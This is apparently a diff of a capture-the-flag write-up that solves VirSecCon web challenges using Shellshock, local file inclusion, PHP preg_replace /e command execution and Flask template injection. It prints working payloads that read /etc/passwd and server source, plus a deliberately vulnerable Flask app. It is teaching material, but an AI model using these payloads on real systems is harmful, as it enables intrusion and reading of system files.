@@ -16,21 +16,7 @@ It was a hint in the website about this vulnerability, then found the `crush.sh`
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://jh2i.com:50020/cgi-bin/crush.sh
 
 root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/bin/sh
-man:x:6:12:man:/var/cache/man:/bin/sh
-lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-mail:x:8:8:mail:/var/mail:/bin/sh
-news:x:9:9:news:/var/spool/news:/bin/sh
-uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/bin/sh
-list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+**deleted**
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
 nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
 libuuid:x:100:101::/var/lib/libuuid:/bin/sh
@@ -46,8 +32,6 @@ yas3r@linux[~/CTF/VirSecCon]$ curl -H "user-agent: () { :; }; echo; echo; /bin/b
 LLS{woah_dude_radical_shellshock}
 ```
 
-
- 
  ### HotAccess : Web Challenge
 
 This challenge is introduction to `LFI` but we need to find the hidden flag, the following url is vulnerable to `lfi` : `http://jh2i.com:50016/index.php?m=`
@@ -95,8 +79,6 @@ yas3r@linux[~/CTF/VirSecCon]
 
 the visit `http://jh2i.com:50016/sshh_dont_tell_i_hid_the_flag_here/flag.txt` to read the flag `LLS{htaccess_can_control_what_you_access}`
 
-
-
 ### GLHF : Web Challenge
 
 this challenge also could be solved using the same technique in `hotaccess` which is `LFI` 
@@ -131,5 +113,52 @@ yas3r@linux[~/CTF/VirSecCon]$ echo PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkP
     */
 ?>
 ```
+### Irregular Expressions : Web Challenge
+
+This one is pretty old but still works in CTF challenges. The vulnerability in `preg_replace` in `PHP`, more information [here](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace).
+
+by adding in the filter field `/e system("cat flag_name_dont_guess_plz index.php ");` to read the flag `LLS{php_preg_replace_may_be_dangerous}`
 
 
+
+### Mask : Web Challenge
+
+By testing  {{1+1}}, we confirm that we are using `flask` framework. Let try to injection `python` code to read local files
+
+```python
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+```
+but we couldn't find any interesting files, so lets read the server file itself.
+
+`{{ ''.__class__.__mro__[2].__subclasses__()[40]('server.py').read() }}`
+
+
+```python
+ #!/usr/bin/env python
+
+import flask
+from flask import request, render_template_string
+
+
+app = flask.Flask(__name__)
+app.config.from_object(__name__)
+app.secret_key = 'LLS{server_side_template_injection_unmasked}'
+
+
+@app.route('/', methods = ["GET", "POST"])
+def index(): 
+
+    mask = "... you have not yet taken off your mask!"
+
+    if request.method == "POST":
+        mask = request.form['mask']
+    
+    return flask.render_template_string(  ''' {%  extends "layout.html"  %}
+    {%  block body  %} ''' + mask + ''' {%  endblock %} ''' )
+
+if ( __name__ == "__main__" ):
+
+    app.run( host='0.0.0.0' )
+```
+
+We can find the flag: `LLS{server_side_template_injection_unmasked}`
